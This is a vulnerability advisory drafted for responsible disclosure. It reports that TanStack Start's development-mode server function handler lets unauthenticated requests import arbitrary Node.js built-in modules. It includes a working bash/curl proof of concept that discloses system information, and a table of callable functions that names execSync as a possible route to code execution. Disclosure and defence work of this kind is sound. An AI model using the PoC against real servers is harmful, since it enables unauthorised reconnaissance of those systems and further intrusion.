## Advisory Title

Development Mode Server Function Handler Allows Arbitrary Node.js Module Import

## Affected Product

- **Package:** @tanstack/server-functions-plugin (part of TanStack Start)
- **Ecosystem:** npm
- **Affected versions:** <= 1.141.1 (and likely all versions)
- **Patched versions:** None (unpatched)

## Severity

**High** (CVSS 3.1: 7.5)

## CWE

- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

---

## Summary

A vulnerability in TanStack Start's development mode server function handler allows unauthenticated attackers to import and invoke arbitrary Node.js built-in modules by crafting malicious server function IDs. This leads to confirmed information disclosure and potent>

## Details

### Vulnerable Code Location

**File:** `packages/server-functions-plugin/src/index.ts` (lines ~191-200)

In development mode, the `getServerFnById` function is generated without any validation:

```javascript
if (this.environment.mode !== 'build') {
  const mod = `
    export async function getServerFnById(id) {
      const decoded = Buffer.from(id, 'base64url').toString('utf8')
      const devServerFn = JSON.parse(decoded)
      const mod = await import(/* @vite-ignore */ devServerFn.file)  // <-- NO VALIDATION
      return mod[devServerFn.export]
    }
  `
  return mod
}
```

The `devServerFn.file` value from the user-controlled function ID is passed directly to `import()` without validation, allowing attackers to specify `node:*` protocol URLs to import any Node.js built-in module.

### Attack Vector

1. Server function endpoint: `/_serverFn/{base64_function_id}?createServerFn`
2. Attacker crafts function ID: `{"file":"node:os","export":"networkInterfaces"}`
3. Base64url encodes it and sends request
4. Server imports `node:os` and calls `networkInterfaces()`
5. Sensitive system information is returned

### Production vs Development

- **Production builds:** Use a static manifest that only allows pre-registered functions (SECURE)
- **Development mode:** Dynamically imports any specified module (VULNERABLE)

## Proof of Concept

```bash
#!/bin/bash
# PoC: Information Disclosure via Arbitrary Module Import

TARGET="http://localhost:3002"  # TanStack Start dev server

# Encode malicious function ID to import node:os
FUNC_ID=$(echo -n '{"file":"node:os","export":"networkInterfaces"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

# Send request with empty seroval payload
curl -s "$TARGET/_serverFn/$FUNC_ID?createServerFn" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"t":{"t":10,"i":0,"p":{"k":[],"v":[],"s":0},"o":0},"f":0,"m":[]}'

# Returns all network interfaces with IPs, MACs, etc.
```

### Confirmed Exploitable Functions

| Module | Function | Impact |
|--------|----------|--------|
| `node:os` | `networkInterfaces()` | Discloses all network interfaces, IPs, MACs |
| `node:os` | `userInfo()` | Discloses username, UID, home directory, shell |
| `node:os` | `cpus()` | Discloses CPU model and count |
| `node:os` | `hostname()` | Discloses system hostname |
| `node:process` | `cwd()` | Discloses full filesystem path |
| `node:child_process` | `execSync()` | Called but fails type check (potential RCE) |

### Why Full RCE is Currently Blocked

The server-functions-handler adds `.context = {...}` to payloads, forcing them to be objects. Functions like `execSync` expect string arguments and fail type checking. However:

1. The dangerous functions ARE being called (confirmed by error messages)
2. A gadget chain working with object arguments could enable full RCE
3. The vulnerability pattern is severe regardless of current RCE limitations

## Impact

### Confirmed
- **Information Disclosure:** Complete system reconnaissance (network topology, user info, paths, hardware)
- **Reconnaissance for Further Attacks:** Disclosed information aids targeted attacks

### Potential
- **Remote Code Execution:** If a suitable gadget chain is found that works with object arguments
- **Denial of Service:** Via functions like `process.exit()` (blocked by type checking currently)

## Remediation

### Recommended Fix

Add validation to development mode `getServerFnById`:

```javascript
export async function getServerFnById(id) {
  const decoded = Buffer.from(id, 'base64url').toString('utf8')
  const devServerFn = JSON.parse(decoded)

  // SECURITY: Validate module path
  if (devServerFn.file.startsWith('node:') ||
      devServerFn.file.startsWith('file:') ||
      !devServerFn.file.startsWith('/@id/')) {
    throw new Error('Invalid server function module path')
  }

  // Additional: Validate against known server function patterns
  if (!devServerFn.file.includes('tsr-directive-use-server')) {
    throw new Error('Not a registered server function')
  }

  const mod = await import(devServerFn.file)
  return mod[devServerFn.export]
}
```

### Alternative Approaches

1. **Maintain dev manifest:** Track registered server functions even in dev mode
2. **Cryptographic signing:** Sign function IDs at compile time, verify at runtime
3. **Path allowlist:** Only allow imports from specific directories

## Timeline

- **2025-12-12:** Vulnerability discovered
- **2025-12-12:** PoC developed and confirmed
- **2025-12-12:** Advisory drafted for responsible disclosure

## Credit

APEX Security Research

---

## Additional Notes for TanStack Team

1. This vulnerability only affects development mode - production builds with the manifest are secure
2. However, many developers expose dev servers on networks (Docker, remote dev, etc.)
3. The `/* @vite-ignore */` comment suggests this was intentionally bypassing Vite's import analysis
4. Consider adding a security notice to documentation about dev server exposure risks

## Contact

michael.groberman@me.com 
